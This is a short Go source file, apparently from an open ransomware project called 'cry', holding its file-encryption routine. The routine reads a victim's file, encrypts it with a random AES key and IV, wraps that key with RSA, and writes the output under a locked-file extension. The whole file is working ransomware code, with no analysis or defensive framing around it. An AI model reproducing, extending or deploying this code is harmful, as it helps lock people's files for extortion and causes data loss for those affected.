package main

import (
	"crypto/rsa"
	"io/ioutil"

	"crypto/aes"
	"crypto/rand"

	"crypto/cipher"

	"github.com/redpois0n/cry/common"
)

func encrypt(file string, priv *rsa.PrivateKey) {
	data, err := ioutil.ReadFile(file)

	if err != nil {
		panic(err)
	}

	key := make([]byte, common.KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)
	pub := priv.PublicKey
	header, err = rsa.EncryptPKCS1v15(rand.Reader, &pub, header)

	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err)
	}

	cipher := cipher.NewCFBEncrypter(block, iv)
	cipher.XORKeyStream(data, data)

	data = append(header, data...)

	ioutil.WriteFile(file+common.LockedExtension, data, 0777)
}
